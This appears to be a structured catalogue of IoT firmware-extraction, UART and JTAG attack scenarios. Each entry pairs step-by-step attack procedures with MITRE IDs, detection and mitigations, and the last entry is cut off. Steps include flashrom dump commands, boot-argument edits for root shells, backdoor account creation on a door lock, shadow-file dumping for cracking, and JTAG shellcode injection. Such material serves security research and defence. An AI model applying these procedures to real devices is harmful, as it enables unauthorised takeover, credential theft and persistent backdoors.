## Binary Diffing of Old vs. New Firmware

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: IoT Gateway
- **Vulnerability**: Historical firmware access
- **MITRE**: T1602
- **Impact**: Vulnerability patch tracking
- **Tools**: Binwalk, Ghidra, Diaphora, Hex-Rays IDA
- **Scenario**: Researcher compares an older version of firmware with a new one to find security patches and backdoors.
- **Attack Steps**: Step 1: Obtain both firmware versions (v1 and v2). Step 2: Use binwalk to extract and isolate binaries. Step 3: Open binaries in Ghidra or IDA. Step 4: Use Diaphora to perform diffing and detect new functions or patched code. Step 5: Investigate added security checks or removed backdoor functions.
- **Detection**: Monitor version control & build signing
- **Solution**: Avoid publishing test builds online
- **Tags**: diff, versioning, patch

## Extracting Firmware via Mobile Companion App Cache

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Mobile-App Controlled Device
- **Vulnerability**: Unprotected app storage
- **MITRE**: T1602
- **Impact**: Leaked firmware via mobile cache
- **Tools**: Android Emulator, ApkTool, Rooted Phone, Binwalk
- **Scenario**: Attacker extracts cached firmware files from mobile app that manages the IoT device.
- **Attack Steps**: Step 1: Install official app on Android emulator. Step 2: Navigate to app data folder (/data/data/<package>/cache). Step 3: Locate downloaded firmware update .bin. Step 4: Copy and analyze using binwalk and strings. Step 5: Reverse engineer core binaries with Ghidra.
- **Detection**: App audit, monitor storage
- **Solution**: Encrypt & secure app cache folder
- **Tags**: mobile, cache, apk

## Extraction from Companion Cloud API

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: IoT Cloud Device
- **Vulnerability**: Weak API authentication
- **MITRE**: T1602, T1210
- **Impact**: Download firmware for any model
- **Tools**: Burp Suite, Postman, Binwalk, Ghidra
- **Scenario**: Researcher accesses cloud API used by mobile app to download firmware directly by manipulating request.
- **Attack Steps**: Step 1: Intercept app requests using Burp Suite or proxy. Step 2: Identify firmware request endpoint (GET /firmware/v1/deviceXYZ). Step 3: Replay and manipulate parameters using Postman. Step 4: Save received .bin file. Step 5: Analyze using binwalk, reverse with Ghidra for backdoor discovery.
- **Detection**: Monitor excessive API use
- **Solution**: Tokenized, signed firmware only
- **Tags**: cloud, api, firmware

## Firmware Extraction via Web Update Panel Interception

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Smart Router / Light Controller
- **Vulnerability**: Unsecured web upload
- **MITRE**: T1602, T1040
- **Impact**: Passive access to full firmware
- **Tools**: Burp Suite, Browser, Binwalk
- **Scenario**: Attacker captures the firmware during upload via an insecure web interface used for manual firmware updates.
- **Attack Steps**: Step 1: Login to the IoT device’s web panel (e.g., router or light controller). Step 2: Go to the firmware update section. Step 3: Intercept the file upload request using Burp Suite. Step 4: Save the firmware .bin file from the POST request payload. Step 5: Analyze the firmware using binwalk to extract files. Step 6: Use Ghidra to reverse engineer internal services.
- **Detection**: Traffic inspection at upload endpoint
- **Solution**: Use HTTPS with token-auth & integrity hash
- **Tags**: web upload, burp, panel

## Dumping Firmware from Cloud-Synced Smart Speaker Logs

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Smart Speaker
- **Vulnerability**: Cloud logs containing firmware
- **MITRE**: T1602
- **Impact**: Cloud data leakage
- **Tools**: Cloud Access, Binwalk, Ghidra, Wireshark
- **Scenario**: Analyst discovers firmware files being uploaded to the cloud in unencrypted log backups.
- **Attack Steps**: Step 1: Access backup logs from cloud dashboard or via intercepted traffic. Step 2: Extract embedded .tar or .img firmware files from logs. Step 3: Use binwalk to pull out file system and binaries. Step 4: Analyze audio processing binaries in Ghidra to discover custom commands or vulnerabilities.
- **Detection**: Monitor backup content uploads
- **Solution**: Encrypt logs and exclude firmware
- **Tags**: cloud, backup, log

## Offline Firmware Analysis from Dumped Flash Drive

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Digital Signage / Kiosk
- **Vulnerability**: Accessible USB firmware
- **MITRE**: T1602
- **Impact**: Full offline firmware reverse engineering
- **Tools**: USB Imager, Binwalk, FTK Imager, Ghidra
- **Scenario**: Technician extracts and analyzes firmware directly from internal USB used in smart digital signage.
- **Attack Steps**: Step 1: Detach internal USB storage device from digital signage unit. Step 2: Use dd or FTK Imager to make a full disk image. Step 3: Run binwalk -e dump.img to extract system and media partitions. Step 4: Examine startup scripts and service configs. Step 5: Use Ghidra to review firmware security measures.
- **Detection**: Monitor unauthorized USB removal
- **Solution**: Use soldered storage or encryption
- **Tags**: usb, signage, offline

## Firmware Leak via API Directory Listing

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Any IoT Device
- **Vulnerability**: API path exposure
- **MITRE**: T1210, T1602
- **Impact**: Unauthorized firmware access
- **Tools**: Browser, Postman, Binwalk
- **Scenario**: Firmware is downloaded from a public server directory due to misconfigured API endpoint.
- **Attack Steps**: Step 1: Access API endpoint used by mobile app (e.g., api.vendor.com/fw/). Step 2: Discover directory listing due to improper server configuration. Step 3: Download all .bin files. Step 4: Use binwalk to extract file systems and locate default config files. Step 5: Analyze firmware logic using Ghidra.
- **Detection**: Monitor excessive API requests
- **Solution**: Disable directory listing, implement auth
- **Tags**: api, directory listing

## Firmware Analysis via Mobile App Reverse Engineering

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: IoT Device w/ Mobile App
- **Vulnerability**: Hardcoded firmware URLs
- **MITRE**: T1602
- **Impact**: Unauthorized firmware acquisition
- **Tools**: ApkTool, JADX, Postman, Binwalk
- **Scenario**: Attacker reverse engineers Android app to locate hardcoded firmware update URL.
- **Attack Steps**: Step 1: Download .apk file of the mobile app. Step 2: Use ApkTool to decompile app and JADX to browse code. Step 3: Locate firmware update function and find direct URL (e.g., https://updates.vendor.com/fw.bin). Step 4: Download firmware and analyze using binwalk and Ghidra.
- **Detection**: App auditing, dynamic analysis
- **Solution**: Obfuscate app logic, use token-based auth
- **Tags**: apk reverse, android, url

## Firmware Dump via eMMC Chip Swap

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Embedded IoT Device
- **Vulnerability**: Physical chip extraction
- **MITRE**: T1602.002
- **Impact**: Total firmware dump & access to all data
- **Tools**: Hot Air Rework Station, eMMC Reader, Binwalk
- **Scenario**: Physical attacker desolders eMMC chip from bricked IoT board and dumps it with specialized reader.
- **Attack Steps**: Step 1: Use microscope and hot air gun to remove eMMC from board. Step 2: Solder it onto a test breakout board. Step 3: Connect to eMMC reader and dump content. Step 4: Use binwalk to extract bootloader, kernel, and file system. Step 5: Reverse engineer vulnerable binaries using Ghidra.
- **Detection**: Visual tamper detection, epoxy over chip
- **Solution**: Use secure eMMC or tamper sensors
- **Tags**: emmc, hardware, chip swap

## Over-the-Air Update Capture via Wi-Fi Sniffing

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: IoT Thermostat
- **Vulnerability**: Unencrypted OTA channel
- **MITRE**: T1557.003, T1602
- **Impact**: Exposed firmware via sniffing
- **Tools**: Wireshark, Aircrack-ng, Binwalk
- **Scenario**: During OTA update, attacker uses wireless sniffer to intercept the firmware image over unencrypted Wi-Fi.
- **Attack Steps**: Step 1: Use airodump-ng to identify device SSID and BSSID. Step 2: Capture traffic with Wireshark or airodump-ng. Step 3: Filter and extract OTA firmware packets. Step 4: Reassemble the captured data into a firmware image. Step 5: Use binwalk and Ghidra for reverse engineering.
- **Detection**: Monitor traffic for OTA anomalies
- **Solution**: Encrypt updates and use WPA3
- **Tags**: ota, wifi, sniff

## Recovery Partition Analysis from Firmware Dump

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: IoT Hub
- **Vulnerability**: Misconfigured recovery partition
- **MITRE**: T1602, T1548
- **Impact**: Unauthorized root shell access
- **Tools**: Binwalk, Ghidra, QEMU
- **Scenario**: Researcher extracts a recovery partition from firmware and finds root shell bypass in boot script.
- **Attack Steps**: Step 1: Use binwalk to extract multiple partitions. Step 2: Isolate recovery partition and mount with loop device. Step 3: Check for /etc/init.d or recovery shell scripts. Step 4: Discover root shell opened without authentication. Step 5: Use Ghidra to confirm bootloader interaction logic.
- **Detection**: Audit recovery partition regularly
- **Solution**: Secure boot process and recovery logic
- **Tags**: recovery, root shell, boot

## Dumping Firmware Using Custom SPI Proxy

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Smart Appliance
- **Vulnerability**: Passive SPI interface
- **MITRE**: T1602.002
- **Impact**: Covert firmware capture
- **Tools**: Raspberry Pi, Logic Analyzer, Python SPI Sniffer
- **Scenario**: Hobbyist builds a custom SPI proxy board to log flash chip traffic without interrupting device function.
- **Attack Steps**: Step 1: Connect Raspberry Pi GPIOs to SPI lines (MOSI, MISO, CLK, GND). Step 2: Write or use existing Python script to log traffic. Step 3: Power on device and record firmware communication. Step 4: Reconstruct captured binary using saved logs. Step 5: Analyze with binwalk and test logic flaws in virtualized environment.
- **Detection**: Monitor GPIO or unusual load
- **Solution**: Shield traces or encrypt firmware in motion
- **Tags**: spi sniffer, proxy, rpi

## Analysis of Firmware Signing Logic in Dumped Image

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: IoT Gateway
- **Vulnerability**: Broken firmware signature logic
- **MITRE**: T1601, T1602
- **Impact**: Upload of malicious firmware
- **Tools**: Binwalk, Ghidra, Strings
- **Scenario**: Researcher finds signature verification bypass in firmware upgrade routine.
- **Attack Steps**: Step 1: Extract firmware using previous dump methods. Step 2: Analyze firmware update binary in Ghidra. Step 3: Look for signature check routines (strcmp, memcmp, etc.). Step 4: Discover that verification step is commented out or flawed. Step 5: Simulate attack by injecting modified firmware.
- **Detection**: Static binary analysis or fuzzing
- **Solution**: Enforce hardware signature validation
- **Tags**: signature, bypass, firmware

## Extracting Firmware from SPI Flash Using Bus Pirate

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: IoT Gateway
- **Vulnerability**: Accessible SPI flash chip
- **MITRE**: T1602.002
- **Impact**: Full firmware acquisition
- **Tools**: Bus Pirate, Flashrom, Binwalk, Ghidra
- **Scenario**: An attacker uses the Bus Pirate hardware tool to interface with the SPI flash memory on a smart gateway.
- **Attack Steps**: Step 1: Open the device casing and locate the SPI flash chip (e.g., 25Q32). Step 2: Connect Bus Pirate pins to SPI flash: MOSI, MISO, CLK, CS, GND. Step 3: Launch terminal and configure SPI settings (m, then 5, then set speed). Step 4: Use Flashrom with Bus Pirate driver to dump firmware: flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r dump.bin. Step 5: Analyze dump.bin using binwalk to extract file system. Step 6: Use Ghidra to inspect extracted binaries for flaws or hardcoded credentials.
- **Detection**: Monitor for hardware probing
- **Solution**: Shield SPI traces, disable SPI post-production
- **Tags**: spi, buspirate, firmware

## Firmware Analysis via Logic Analyzer During Boot

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Smart IoT Sensor
- **Vulnerability**: Unprotected flash bus
- **MITRE**: T1602
- **Impact**: Covert firmware capture
- **Tools**: Logic Analyzer (Saleae), PulseView, Binwalk
- **Scenario**: A researcher records and reconstructs SPI firmware data using a logic analyzer during device boot.
- **Attack Steps**: Step 1: Solder thin wires to SPI flash chip pins (MISO, MOSI, CLK, CS). Step 2: Connect to logic analyzer and open PulseView. Step 3: Start recording and power the device on. Step 4: Save the communication stream and export MISO data (binary data from flash to MCU). Step 5: Reassemble raw binary using SPI protocol decoder. Step 6: Use binwalk to extract and analyze firmware.
- **Detection**: Boot-time tamper alerts
- **Solution**: Use encrypted SPI or disable read access
- **Tags**: logic analyzer, spi, sniff

## Dumping Firmware from I2C EEPROM Using Arduino

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: IoT Light Controller
- **Vulnerability**: Exposed I2C EEPROM
- **MITRE**: T1602
- **Impact**: Access to boot config, keys
- **Tools**: Arduino Uno, I2C Scanner Sketch, EEPROM Dumper, Binwalk
- **Scenario**: An attacker uses an Arduino and custom sketch to dump EEPROM containing firmware config or bootloader.
- **Attack Steps**: Step 1: Identify I2C EEPROM on the board (e.g., AT24C256). Step 2: Connect Arduino to SDA, SCL, GND, VCC pins of EEPROM. Step 3: Upload I2C scanner sketch to detect device address. Step 4: Upload EEPROM dumper sketch to read and save all memory to .bin file. Step 5: Save data to PC via serial terminal or SD card. Step 6: Analyze contents using binwalk or strings.
- **Detection**: Monitor I2C activity and tampering
- **Solution**: Encrypt EEPROM data or disable I2C
- **Tags**: i2c, arduino, eeprom

## Reverse Engineering Update Mechanism from Firmware Image

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Any IoT Device
- **Vulnerability**: Poor update verification
- **MITRE**: T1601, T1602
- **Impact**: Modified firmware injection
- **Tools**: Binwalk, Ghidra, Strings
- **Scenario**: Security analyst extracts firmware and inspects the update logic to identify bypass points.
- **Attack Steps**: Step 1: Extract filesystem from firmware image using binwalk -e firmware.bin. Step 2: Browse extracted /usr/bin/ or /sbin/ for update-related binaries. Step 3: Use strings to find function names like verify_signature, apply_update. Step 4: Load the binary into Ghidra and find entry points related to firmware validation. Step 5: Discover a logic flaw such as the signature check being disabled during debug mode. Step 6: Simulate firmware update with modified content in a virtual lab.
- **Detection**: Monitor firmware update behavior
- **Solution**: Require hardware root of trust
- **Tags**: firmware, update, reverse

## Dumping Flash via Raspberry Pi GPIO SPI Interface

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Smart Hub
- **Vulnerability**: Unsecured physical flash
- **MITRE**: T1602.002
- **Impact**: Full memory dump
- **Tools**: Raspberry Pi, Flashrom, Binwalk
- **Scenario**: A hobbyist uses a Raspberry Pi to connect to a flash chip directly via GPIO pins and extract firmware.
- **Attack Steps**: Step 1: Connect Pi GPIO pins (MISO, MOSI, CLK, CS, GND) to the flash chip. Step 2: Enable SPI interface on Raspberry Pi using raspi-config. Step 3: Run flashrom -p linux_spi:dev=/dev/spidev0.0 -r dump.bin to read firmware. Step 4: Use binwalk -e dump.bin to extract partitions. Step 5: Analyze extracted files using Ghidra.
- **Detection**: GPIO interface usage alerts
- **Solution**: Block SPI access post-boot
- **Tags**: rpi, spi, flashrom

## Cloud-Based Firmware Enumeration via Unauthenticated API

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Cloud-Connected IoT Device
- **Vulnerability**: Poorly authenticated firmware API
- **MITRE**: T1602
- **Impact**: Mass firmware exfiltration
- **Tools**: Browser, Postman, Binwalk
- **Scenario**: Researcher discovers a cloud firmware update API that lists all device firmware without login.
- **Attack Steps**: Step 1: Use proxy to intercept firmware update API from mobile app. Step 2: Discover that the URL allows enumeration (e.g., GET /firmware/list). Step 3: Download multiple firmware files. Step 4: Extract them using binwalk. Step 5: Compare versions and identify security changes or vulnerabilities.
- **Detection**: API rate limit & IP monitoring
- **Solution**: Require authentication and signed requests
- **Tags**: cloud api, firmware list

## Reverse Engineering Firmware for Hardcoded Secrets

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: IoT Camera / Sensor
- **Vulnerability**: Hardcoded secrets
- **MITRE**: T1606.001
- **Impact**: Credential leaks, API abuse
- **Tools**: Binwalk, Strings, Ghidra
- **Scenario**: Security engineer searches for hardcoded credentials or API keys within firmware binaries.
- **Attack Steps**: Step 1: Extract firmware with binwalk. Step 2: Use strings to search binaries for suspicious keys, passwords. Step 3: Import binaries in Ghidra and navigate to known memory sections (e.g., .rodata). Step 4: Identify string references in firmware source to insecure APIs. Step 5: Document secrets and simulate impact by using the credentials to access back-end services.
- **Detection**: Scan firmware regularly with string scanners
- **Solution**: Use secure vaults and key rotation
- **Tags**: hardcoded, secrets, strings

## Memory Dump Using FTDI SPI Adapter on Powered Device

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: IoT Gateway
- **Vulnerability**: Exposed flash during runtime
- **MITRE**: T1602.002
- **Impact**: Live firmware theft
- **Tools**: FTDI SPI Adapter, Flashrom, Binwalk
- **Scenario**: A technician connects FTDI SPI to a powered-on device's flash and dumps contents without disassembly.
- **Attack Steps**: Step 1: Identify SOIC flash chip and clip with SOIC8 test clip. Step 2: Connect clip to FTDI SPI adapter and PC. Step 3: Launch flashrom with FTDI driver: flashrom -p ft2232_spi -r firmware.bin. Step 4: Use binwalk to extract and examine the firmware structure. Step 5: Reverse engineer the main executable with Ghidra.
- **Detection**: Flash read alert (if supported)
- **Solution**: Disable flash access while powered
- **Tags**: ftdi, flashrom, dump

## Modifying Dumped Firmware and Bypassing Boot Checks

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: IoT Device
- **Vulnerability**: Weak bootloader integrity checks
- **MITRE**: T1542, T1601
- **Impact**: Unauthorized firmware load
- **Tools**: Flashrom, Binwalk, Ghidra, Hex Editor
- **Scenario**: Researcher modifies a dumped firmware image and re-flashes it to bypass device bootloader security.
- **Attack Steps**: Step 1: Dump the firmware from SPI chip using flashrom. Step 2: Use binwalk to identify and extract bootloader partition. Step 3: Open extracted bootloader binary in Ghidra and locate boot check routine. Step 4: Modify conditional jump in binary using hex editor to bypass check. Step 5: Repack image and re-flash with flashrom -w modified.bin. Step 6: Test boot process in controlled environment.
- **Detection**: Firmware checksum mismatch
- **Solution**: Use secure boot and signed checks
- **Tags**: boot bypass, firmware mod

## Passive Firmware Capture Using RF Sniffing on IoT OTA

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: RF-Based IoT Devices
- **Vulnerability**: Unencrypted wireless updates
- **MITRE**: T1557.003, T1602
- **Impact**: Remote firmware theft
- **Tools**: RTL-SDR, GQRX, GNU Radio, Binwalk
- **Scenario**: Hacker uses SDR to sniff unencrypted over-the-air firmware updates sent via RF.
- **Attack Steps**: Step 1: Use GQRX with RTL-SDR to scan for active RF frequencies during update. Step 2: Record OTA firmware update traffic. Step 3: Use GNU Radio to demodulate signal and save data stream. Step 4: Reassemble .bin firmware image. Step 5: Use binwalk to extract and analyze firmware.
- **Detection**: Detect RF emissions & traffic anomalies
- **Solution**: Encrypt OTA and use device-specific keys
- **Tags**: rf, ota, sdr, sniff

## Extracting Firmware from OTA Zip Packages

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: IoT Thermostat
- **Vulnerability**: Public OTA packages
- **MITRE**: T1602
- **Impact**: Unsupervised firmware access
- **Tools**: OTA Zip File, 7-Zip, Binwalk, Ghidra
- **Scenario**: Researcher downloads and unpacks an official OTA .zip file to analyze firmware image.
- **Attack Steps**: Step 1: Download OTA update .zip file from vendor’s website or app. Step 2: Use 7-Zip to extract contents; locate files like system.img, boot.img. Step 3: Use binwalk -e system.img to extract file system. Step 4: Explore extracted directories such as /etc, /usr/bin, /lib. Step 5: Load key binaries into Ghidra for reverse engineering. Step 6: Document any backdoors, hardcoded credentials, or update logic flaws.
- **Detection**: Monitor OTA downloads
- **Solution**: Sign and encrypt update packages
- **Tags**: ota, zip, firmware

## Recovering Deleted Firmware Partitions from Flash Dump

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Smart Kiosk / Panel
- **Vulnerability**: Orphaned flash partitions
- **MITRE**: T1005, T1602
- **Impact**: Access to old vulnerable firmware
- **Tools**: Flashrom, Hex Editor, Binwalk, Foremost
- **Scenario**: Researcher finds remnants of old firmware versions in unused flash space.
- **Attack Steps**: Step 1: Dump full flash using flashrom -r full_dump.bin. Step 2: Open dump in hex editor and search for partition headers (e.g., UBI, squashfs). Step 3: Use foremost or binwalk --dd to recover deleted partitions. Step 4: Analyze recovered binaries using Ghidra. Step 5: Compare with active firmware to identify patches, missing security measures, or removed backdoors.
- **Detection**: Flash forensics
- **Solution**: Sanitize or encrypt unused flash areas
- **Tags**: deleted, partition, recovery

## Exploiting OTA Pre-Download Cache

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Android-Based IoT Device
- **Vulnerability**: Unprotected cache
- **MITRE**: T1602, T1555
- **Impact**: Pre-install firmware tampering
- **Tools**: ADB, File Browser, Binwalk
- **Scenario**: Attacker accesses temporary OTA files stored in device’s cache before actual update is triggered.
- **Attack Steps**: Step 1: Connect to IoT Android-based system using ADB (adb shell). Step 2: Navigate to /data/cache/ or /data/ota/. Step 3: Copy cached OTA binary to local system using adb pull. Step 4: Use binwalk to extract and analyze the file. Step 5: Reverse engineer update process to assess possibility of injecting tampered firmware before install.
- **Detection**: Monitor cache and access attempts
- **Solution**: Encrypt cached data, use atomic OTA
- **Tags**: cache, ota, adb

## Firmware Dump via BLE Firmware Update Interception

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: BLE IoT Device
- **Vulnerability**: BLE without encryption or pairing
- **MITRE**: T1557.003, T1602
- **Impact**: Wireless firmware theft
- **Tools**: Nordic nRF Sniffer, Wireshark, Binwalk
- **Scenario**: Attacker captures BLE firmware update process using sniffing tools to extract .bin image.
- **Attack Steps**: Step 1: Set up nRF Sniffer with BLE dongle and launch Wireshark. Step 2: Capture BLE traffic during a firmware update. Step 3: Reconstruct firmware binary from Write Request packets. Step 4: Save as .bin and analyze with binwalk. Step 5: Check for embedded secrets or firmware vulnerabilities using Ghidra.
- **Detection**: BLE packet inspection tools
- **Solution**: Enforce secure pairing + signed firmware
- **Tags**: ble, ota, sniffing

## Emulating Extracted Firmware in QEMU for Behavioral Analysis

- **Attack Type**: Firmware Extraction & Analysis
- **Target**: Embedded Linux IoT
- **Vulnerability**: Emulatable firmware
- **MITRE**: T1602, T1203
- **Impact**: Real-world service abuse via emulated system
- **Tools**: Binwalk, QEMU, Ghidra, Netcat
- **Scenario**: Analyst runs extracted firmware inside QEMU to interact with the system and analyze behavior.
- **Attack Steps**: Step 1: Use binwalk to extract root filesystem and kernel. Step 2: Identify CPU architecture (file vmlinux, e.g., ARM). Step 3: Set up QEMU for the matching architecture. Step 4: Boot firmware using emulated serial or network interface. Step 5: Observe services, logs, and network behavior. Step 6: Inject commands via netcat or serial shell to test security posture.
- **Detection**: Monitor behavior in production vs. emulation
- **Solution**: Obfuscate or containerize core logic
- **Tags**: emulation, qemu, firmware

## Extracting Hardcoded Credentials via UART

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Smart Camera
- **Vulnerability**: Exposed UART header with unrestricted bootloader
- **MITRE**: T1040 - Boot or Logon Initialization Scripts
- **Impact**: Unauthorized root access
- **Tools**: USB to TTL adapter (FTDI), Minicom, Screwdriver, Multimeter
- **Scenario**: An attacker connects to the UART debug port on a smart IP camera to access the bootloader menu and retrieve root credentials.
- **Attack Steps**: Step 1: Identify UART pins on the PCB using a multimeter. Step 2: Connect USB-to-TTL adapter to the TX, RX, and GND pins. Step 3: Use Minicom to connect to the serial console at common baud rates (e.g., 115200). Step 4: Reboot the device and observe boot messages. Step 5: Interrupt bootloader if possible (press a key). Step 6: Explore shell/bootloader menu for user accounts or environment variables. Step 7: Extract hardcoded credentials from boot logs or shell. Step 8: Use credentials to login via SSH or web admin.
- **Detection**: Monitor UART pads; unexpected UART traffic
- **Solution**: Disable debug ports in production; require authentication in bootloader
- **Tags**: UART, Debug Port, Credentials, Smart Camera

## Full Root Shell Access via Open UART Console

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Home Wi-Fi Router
- **Vulnerability**: UART console with no authentication
- **MITRE**: T1055 - Process Injection
- **Impact**: Full system takeover
- **Tools**: USB to TTL, Minicom, Router teardown tools
- **Scenario**: The attacker gains root shell access by connecting to an unprotected UART console on a Wi-Fi router.
- **Attack Steps**: Step 1: Open the router casing and inspect the PCB. Step 2: Identify GND, TX, RX using silkscreen or probing with a multimeter. Step 3: Connect USB-to-TTL device and launch Minicom at 115200 baud rate. Step 4: Reboot the router and watch for login prompt. Step 5: Try default login such as root with no password. Step 6: Gain root shell and inspect filesystem. Step 7: Dump configuration files and firmware via shell.
- **Detection**: Boot-time UART activity logs
- **Solution**: Remove UART access or secure with password shell
- **Tags**: Router, UART Access, Reverse Engineering

## Dumping Firmware via Bootloader UART

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Embedded Sensor Device
- **Vulnerability**: Bootloader allows memory dumping
- **MITRE**: T1005 - Data from Local System
- **Impact**: IP theft or firmware modification
- **Tools**: USB-TTL adapter, Tera Term, Strings, Binwalk
- **Scenario**: Attacker accesses bootloader menu to dump the entire firmware binary for offline analysis.
- **Attack Steps**: Step 1: Identify UART interface and connect via TTL adapter. Step 2: Boot device and interrupt U-Boot with keystroke. Step 3: Use bootloader commands like loadb or dump to extract memory. Step 4: Send output to terminal and save as firmware.bin. Step 5: Analyze firmware with Binwalk or Strings to identify passwords or logic.
- **Detection**: UART data exfiltration
- **Solution**: Disable memory dump features in bootloader
- **Tags**: Firmware Dump, Reverse Engineering, UART

## JTAG Dump to Clone Flash Memory

- **Attack Type**: JTAG Exploitation
- **Target**: Smart Thermostat
- **Vulnerability**: Accessible JTAG interface with no protection
- **MITRE**: T1602 - Data from Information Repositories
- **Impact**: Firmware analysis, cloning, or backdoor insertion
- **Tools**: JTAGulator, OpenOCD, Bus Blaster, Flashrom
- **Scenario**: Using the JTAG interface, the attacker connects to a smart thermostat and dumps flash memory to reverse engineer it.
- **Attack Steps**: Step 1: Open device and locate JTAG pins via documentation or probing. Step 2: Use JTAGulator to identify correct pinout (TCK, TDI, TDO, TMS, GND). Step 3: Connect using Bus Blaster and run OpenOCD. Step 4: Use OpenOCD to halt processor and access memory map. Step 5: Dump flash memory contents to a file. Step 6: Use Flashrom to validate memory dump. Step 7: Analyze dump with Binwalk, Strings, and Ghidra.
- **Detection**: JTAG pin activity during boot
- **Solution**: Disable JTAG or apply fuse locks in production
- **Tags**: JTAG, Firmware Reverse Engineering

## Hijacking Bootloader Environment Variables

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Embedded Linux Device
- **Vulnerability**: Writable boot environment over UART
- **MITRE**: T1542 - Pre-OS Boot
- **Impact**: Unauthorized privilege escalation
- **Tools**: USB-TTL, U-Boot shell, Minicom
- **Scenario**: The attacker modifies bootloader environment variables via UART to boot into single-user mode and change the root password.
- **Attack Steps**: Step 1: Connect UART via TTL adapter and open Minicom. Step 2: Interrupt boot at U-Boot prompt. Step 3: Use printenv to list boot variables. Step 4: Modify bootargs to add init=/bin/sh or single. Step 5: Save environment with saveenv. Step 6: Reboot device to boot into root shell. Step 7: Use passwd to reset root password. Step 8: Restore original bootargs.
- **Detection**: UART boot modifications
- **Solution**: Lock bootloader or restrict shell access
- **Tags**: UART, U-Boot, Privilege Escalation

## Backdoor Creation via UART Console

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Smart Door Lock
- **Vulnerability**: UART shell without access control
- **MITRE**: T1136.001 - Create Account
- **Impact**: Persistent backdoor and physical compromise
- **Tools**: USB-TTL Adapter, Minicom, passwd command, BusyBox shell
- **Scenario**: The attacker uses UART access to create a persistent backdoor user on a consumer smart door lock system running Linux.
- **Attack Steps**: Step 1: Disassemble the door lock device and locate UART headers. Step 2: Use a multimeter to confirm pinouts and connect TX, RX, GND to USB-TTL adapter. Step 3: Launch Minicom on the attacker laptop and connect to the device using baud rate 115200. Step 4: Reboot the device to observe boot messages. Step 5: Interrupt the boot process if needed or wait for login prompt. Step 6: Use default credentials (often root with no password). Step 7: Once in shell, add a new user using adduser hacker and passwd hacker. Step 8: Add this user to sudoers or relevant privilege group. Step 9: Modify /etc/passwd or init scripts to ensure persistence across reboots.
- **Detection**: Bootlog or new users in /etc/passwd
- **Solution**: Lock shell access, disable debug mode in production
- **Tags**: UART, Door Lock, Backdoor, Embedded Linux

## Bypassing Root Password by Modifying Init Script

- **Attack Type**: UART Debug Port Exploitation
- **Target**: IoT Gateway
- **Vulnerability**: Unprotected init scripts in UART shell
- **MITRE**: T1546 - Event Triggered Execution
- **Impact**: Complete system takeover
- **Tools**: USB-TTL, BusyBox Shell, vi/nano
- **Scenario**: Exploiting unrestricted UART shell to replace init scripts and gain root without password.
- **Attack Steps**: Step 1: Open device and locate UART pinout using PCB labeling. Step 2: Connect using USB-TTL and launch a serial console (Minicom or PuTTY). Step 3: Wait for boot process to finish and observe BusyBox shell prompt. Step 4: Check if /etc/inittab or /etc/init.d/rcS exists. Step 5: Modify init script to launch /bin/sh instead of login. Step 6: Reboot and get root shell directly on next boot. Step 7: Access the full system without any password requirement.
- **Detection**: Boot script integrity checks
- **Solution**: Use secure boot, read-only filesystem
- **Tags**: Init script abuse, UART, No Auth

## Memory Map Access via JTAG to Inject Custom Code

- **Attack Type**: JTAG Exploitation
- **Target**: Embedded Controller Board
- **Vulnerability**: Unlocked JTAG with full memory access
- **MITRE**: T1106 - Native API
- **Impact**: Arbitrary code execution
- **Tools**: OpenOCD, Bus Pirate, GDB, JTAGulator, Ghidra
- **Scenario**: The attacker uses JTAG to pause CPU execution, then injects custom shellcode into memory and resumes execution.
- **Attack Steps**: Step 1: Locate JTAG test points on PCB and confirm pinout using JTAGulator. Step 2: Connect Bus Pirate to the JTAG pins. Step 3: Launch OpenOCD and attach to the device's memory. Step 4: Halt processor execution. Step 5: Use GDB to find free space in memory. Step 6: Inject custom shellcode to create reverse shell or alter boot behavior. Step 7: Resume execution and observe the effect.
- **Detection**: Unusual memory map activity
- **Solution**: Disable JTAG in production or lock via fuses
- **Tags**: JTAG, Shellcode Injection

## Dumping Encrypted Password File via UART

- **Attack Type**: UART Debug Port Exploitation
- **Target**: IoT Surveillance Camera
- **Vulnerability**: No access control on shadow file
- **MITRE**: T1003.008 - /etc/shadow
- **Impact**: Credential theft
- **Tools**: USB-TTL, Minicom, John the Ripper, Hashcat
- **Scenario**: Attacker accesses a Linux-based IoT camera and dumps /etc/shadow over UART for offline password cracking.
- **Attack Steps**: Step 1: Open the IoT camera enclosure and connect to the UART port. Step 2: Launch Minicom and boot the device, log in using default credentials. Step 3: Navigate to /etc/shadow file and read its contents. Step 4: Copy the hash entries and save them to the attacker's system. Step 5: Use John the Ripper or Hashcat to crack weak or default passwords offline. Step 6: Use cracked credentials for SSH or web access.
- **Detection**: Monitor for shadow file access
- **Solution**: Encrypt or restrict access to sensitive files
- **Tags**: UART, Password Cracking, Shadow File

## Booting into Maintenance Mode via UART

- **Attack Type**: UART Debug Port Exploitation
